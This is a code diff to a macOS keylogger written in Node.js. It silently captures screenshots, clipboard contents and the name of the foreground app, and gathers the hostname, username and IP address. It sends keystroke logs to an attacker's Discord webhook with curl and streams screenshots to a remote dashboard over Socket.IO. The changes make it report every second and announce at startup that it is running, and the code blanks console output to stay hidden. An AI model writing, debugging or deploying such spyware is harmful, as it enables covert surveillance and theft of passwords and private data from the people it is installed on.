@@ -777,62 +777,63 @@ function takeScreenshot() {
     // Save keys before clearing
     const keysToSend = currentKeys;
     
-    exec(`screencapture -x "${filepath}"`, (error, stdout, stderr) => {
-        if (error) {
-            // Screenshot failed - still send keylog without screenshot
-            sendKeylogToDiscord(keysToSend, processTitle, null);
-            keysBuffer = '';
-            return;
-        }
-        
-        if (fs.existsSync(filepath)) {
-            try {
-                const imageBuffer = fs.readFileSync(filepath);
-                const base64Image = imageBuffer.toString('base64');
-                const dataURL = `data:image/png;base64,${base64Image}`;
-                
-                // ALWAYS send keylog WITH screenshot to Discord
-                sendKeylogToDiscord(keysToSend, processTitle, dataURL);
-                
-                // Also send to dashboard via Socket.IO
-                if (socket && socket.connected) {
-                    socket.emit('screenshot', {
-                        clientId: CLIENT_ID,
-                        image: dataURL,
-                        keys: keysToSend,
-                        timestamp: timestamp
-                    });
+        exec(`screencapture -x "${filepath}"`, (error, stdout, stderr) => {
+            if (error) {
+                // Screenshot failed - still send keylog without screenshot
+                sendKeylogToDiscord(keysToSend, processTitle, null);
+                keysBuffer = '';
+                return;
+            }
+            
+            if (fs.existsSync(filepath)) {
+                try {
+                    const imageBuffer = fs.readFileSync(filepath);
+                    const base64Image = imageBuffer.toString('base64');
+                    const dataURL = `data:image/png;base64,${base64Image}`;
+                    
+                    // Send keylog to Discord (text only - Discord webhooks don't support base64 images)
+                    sendKeylogToDiscord(keysToSend, processTitle, filepath);
+                    
+                    // Send screenshot to dashboard via Socket.IO (this works with base64)
+                    if (socket && socket.connected) {
+                        socket.emit('screenshot', {
+                            clientId: CLIENT_ID,
+                            image: dataURL,
+                            keys: keysToSend,
+                            processTitle: processTitle,
+                            timestamp: timestamp
+                        });
+                    }
+                    
+                    // Clean up file after a delay (keep it for potential upload)
+                    setTimeout(() => { 
+                        try { 
+                            fs.unlinkSync(filepath); 
+                        } catch (e) {} 
+                    }, 30000); // Keep for 30 seconds
+                } catch (e) {
+                    // Error reading file - still send keylog
+                    sendKeylogToDiscord(keysToSend, processTitle, null);
                 }
-                
-                // Clean up file
-                setTimeout(() => { 
-                    try { 
-                        fs.unlinkSync(filepath); 
-                    } catch (e) {} 
-                }, 10000);
-            } catch (e) {
-                // Error reading file - still send keylog
+            } else {
+                // File doesn't exist - still send keylog
                 sendKeylogToDiscord(keysToSend, processTitle, null);
             }
-        } else {
-            // File doesn't exist - still send keylog
-            sendKeylogToDiscord(keysToSend, processTitle, null);
-        }
-        
-        // Clear buffer AFTER sending (but keep last 100 chars for context)
-        if (keysBuffer.length > 100) {
-            keysBuffer = keysBuffer.substring(keysBuffer.length - 100);
-        } else {
-            keysBuffer = '';
-        }
-    });
+            
+            // Clear buffer AFTER sending (but keep last 100 chars for context)
+            if (keysBuffer.length > 100) {
+                keysBuffer = keysBuffer.substring(keysBuffer.length - 100);
+            } else {
+                keysBuffer = '';
+            }
+        });
 }
 
-// Send keylog to Discord in the format user wants (WITH screenshot)
-function sendKeylogToDiscord(buffer, processTitle, screenshotDataURL = null) {
+// Send keylog to Discord in the format user wants (WITH screenshot file)
+function sendKeylogToDiscord(buffer, processTitle, screenshotFilePath = null) {
     if (!buffer || buffer.length === 0) buffer = '[No activity]';
     
-    const ip = require('os').networkInterfaces();
+    const ip = os.networkInterfaces();
     let ipAddress = 'Unknown';
     for (const name of Object.keys(ip)) {
         for (const iface of ip[name]) {
@@ -846,85 +847,47 @@ function sendKeylogToDiscord(buffer, processTitle, screenshotDataURL = null) {
     
     const keylogContent = `**Keylogger**\n\`\`\`\nBuffer: ${buffer.substring(0, 1000)}\nProcess Title: ${processTitle}\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nIP Address: ${ipAddress}\n\`\`\``;
     
-    let payload;
-    if (screenshotDataURL) {
-        // Include screenshot
-        payload = {
-            content: keylogContent,
-            embeds: [{
-                image: { url: screenshotDataURL },
-                timestamp: new Date().toISOString()
-            }]
-        };
-    } else {
-        // Just text
-        payload = {
-            content: keylogContent
-        };
-    }
+    // Discord webhooks don't support base64 images - send text only for now
+    // Screenshots are sent to dashboard via Socket.IO
+    const payload = {
+        content: keylogContent
+    };
     
     const payloadFile = path.join(screenshotDir, `keylog_${Date.now()}.json`);
     try {
         fs.writeFileSync(payloadFile, JSON.stringify(payload));
-        exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${payloadFile}" "${WEBHOOK}"`, (error) => {
-            setTimeout(() => {
-                try { fs.unlinkSync(payloadFile); } catch (e) {}
-            }, 5000);
-        });
-    } catch (e) {
-        // Fallback
-        const msg = `Keylogger\nBuffer: ${buffer.substring(0, 500)}\nProcess: ${processTitle}\nHostname: ${HOSTNAME}\nUser: ${USERNAME}\nIP: ${ipAddress}`;
-        exec(`curl -s -X POST -H "Content-Type: application/json" -d '{"content":"${msg.replace(/"/g, '\\"').replace(/\n/g, '\\n')}"}' "${WEBHOOK}"`, () => {});
-    }
-}
-
-function sendToDiscord(imageData, keys) {
-    const keysText = keys && keys.length > 0 ? keys : '[Periodic screenshot - no activity detected]';
-    const timestamp = new Date().toISOString();
-    
-    // Create payload - use file-based approach to avoid JSON escaping issues
-    const payloadFile = path.join(screenshotDir, `payload_${Date.now()}.json`);
-    
-    let payload;
-    if (imageData) {
-        payload = {
-            content: `📸 **Screenshot from ${CLIENT_ID}**\n**Activity:** \`${keysText.substring(0, 500)}\``,
-            embeds: [{ 
-                image: { url: imageData },
-                description: `**Activity Log:**\n\`\`\`\n${keysText.substring(0, 1000)}\n\`\`\``,
-                timestamp: timestamp,
-                color: keysText.includes('No activity') ? 0x999999 : 0x2ecc71
-            }]
-        };
-    } else {
-        // No image - just send text
-        payload = {
-            content: `📸 **Activity from ${CLIENT_ID}**\n**Activity:** \`${keysText.substring(0, 500)}\``,
-            embeds: [{ 
-                description: `**Activity Log:**\n\`\`\`\n${keysText.substring(0, 1000)}\n\`\`\``,
-                timestamp: timestamp,
-                color: 0x2ecc71
-            }]
-        };
-    }
-    
-    // Write payload to file to avoid shell escaping issues
-    try {
-        fs.writeFileSync(payloadFile, JSON.stringify(payload));
-        // Send using file
+        
+        // Send with error handling and logging
         exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${payloadFile}" "${WEBHOOK}"`, (error, stdout, stderr) => {
+            // Log to file for debugging
+            const logFile = path.join(screenshotDir, 'discord_send.log');
+            const logEntry = `[${new Date().toISOString()}] Sent keylog: ${buffer.substring(0, 50)}... Error: ${error ? error.message : 'none'} STDOUT: ${stdout} STDERR: ${stderr}\n`;
+            try {
+                fs.appendFileSync(logFile, logEntry);
+            } catch (e) {}
+            
             // Clean up payload file
             setTimeout(() => {
                 try { fs.unlinkSync(payloadFile); } catch (e) {}
             }, 5000);
         });
     } catch (e) {
-        // Fallback: simple text message if file write fails
-        const simpleMsg = `📸 Activity from ${CLIENT_ID}\nActivity: ${keysText.substring(0, 500)}`;
-        const escapedMsg = simpleMsg.replace(/"/g, '\\"').replace(/\n/g, '\\n');
-        exec(`curl -s -X POST -H "Content-Type: application/json" -d '{"content":"${escapedMsg}"}' "${WEBHOOK}"`, () => {});
+        // Fallback - send simple text message
+        const msg = `Keylogger\nBuffer: ${buffer.substring(0, 500)}\nProcess: ${processTitle}\nHostname: ${HOSTNAME}\nUser: ${USERNAME}\nIP: ${ipAddress}`;
+        const escapedMsg = msg.replace(/"/g, '\\"').replace(/\n/g, '\\n');
+        exec(`curl -s -X POST -H "Content-Type: application/json" -d '{"content":"${escapedMsg}"}' "${WEBHOOK}"`, (error, stdout, stderr) => {
+            const logFile = path.join(screenshotDir, 'discord_send.log');
+            const logEntry = `[${new Date().toISOString()}] Fallback send: ${buffer.substring(0, 50)}... Error: ${error ? error.message : 'none'}\n`;
+            try {
+                fs.appendFileSync(logFile, logEntry);
+            } catch (e) {}
+        });
     }
 }
+
+// REMOVED sendToDiscord function - it was causing E2BIG errors with base64 images
+// Discord webhooks don't support base64 images, so we only send text via sendKeylogToDiscord
+// Screenshots are sent to dashboard via Socket.IO only
 
 // AGGRESSIVE KEYSTROKE CAPTURE - Multiple methods to capture typing
 let clipboardCheckCount = 0;
@@ -958,9 +921,8 @@ setInterval(() => {
                     lastKeyTime = Date.now();
                     
                     // Send IMMEDIATELY when clipboard changes WITH screenshot
-                    setTimeout(() => {
-                        takeScreenshot();
-                    }, 150);
+                    // Don't wait - send right away
+                    takeScreenshot();
                 });
             }
         }
@@ -971,6 +933,19 @@ setInterval(() => {
             exec(`osascript -e 'tell application "System Events" to get name of first process whose frontmost is true' 2>/dev/null`, (appError, appName) => {
                 const processTitle = appError ? lastProcessTitle : (appName ? appName.trim() : lastProcessTitle);
                 lastProcessTitle = processTitle;
+                // Send immediately
+                takeScreenshot();
+            });
+        }
+        
+        // Every 20 checks (1 second), force send even if no clipboard change (to ensure regular updates)
+        if (clipboardCheckCount % 20 === 0) {
+            exec(`osascript -e 'tell application "System Events" to get name of first process whose frontmost is true' 2>/dev/null`, (appError, appName) => {
+                const processTitle = appError ? lastProcessTitle : (appName ? appName.trim() : lastProcessTitle);
+                lastProcessTitle = processTitle;
+                if (keysBuffer.length === 0) {
+                    keysBuffer = `[Periodic Update - ${processTitle} - ${new Date().toLocaleTimeString()}]`;
+                }
                 takeScreenshot();
             });
         }
@@ -1095,11 +1070,26 @@ setTimeout(() => {
     takeScreenshot();
 }, 3000);
 
-// Test Discord connection on startup (with screenshot)
+// Test Discord connection on startup (send immediately, no screenshot needed)
 setTimeout(() => {
+    // Send test message directly to Discord to verify webhook works
+    const testPayload = {
+        content: `✅ **Keylogger Started Successfully**\n\`\`\`\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nStatus: Running 24/7\nTimestamp: ${new Date().toISOString()}\n\`\`\``
+    };
+    const testFile = path.join(screenshotDir, `test_${Date.now()}.json`);
+    try {
+        fs.writeFileSync(testFile, JSON.stringify(testPayload));
+        exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${testFile}" "${WEBHOOK}"`, (error, stdout, stderr) => {
+            setTimeout(() => {
+                try { fs.unlinkSync(testFile); } catch (e) {}
+            }, 5000);
+        });
+    } catch (e) {}
+    
+    // Also send via screenshot function
     keysBuffer = '[Keylogger Started - Testing Discord Connection]';
     takeScreenshot(); // This will send keylog + screenshot
-}, 5000);
+}, 2000);
 
 console.log = () => {};
 console.error = () => {};
